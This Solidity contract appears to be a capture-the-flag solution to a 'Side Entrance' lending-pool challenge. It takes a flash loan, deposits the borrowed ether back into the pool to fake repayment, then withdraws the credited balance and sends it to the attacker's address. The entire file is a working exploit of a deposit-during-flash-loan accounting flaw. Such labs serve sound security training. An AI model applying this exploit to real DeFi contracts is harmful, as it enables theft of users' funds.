// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.7;

import "../Contracts/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttack {
    SideEntranceLenderPool pool;
    address payable owner;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = payable(msg.sender);
    }

    function attack(uint256 amount) external {
        // call flashLoan()

        pool.flashLoan(amount);

        // after we deposited then we can call withdraw() with all funds
        

        pool.withdraw();
    }

    function execute() external payable {
        // after execute() is called , we need to imidiatly call deposit()

        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {
        owner.call{value: address(this).balance}("");
    }
}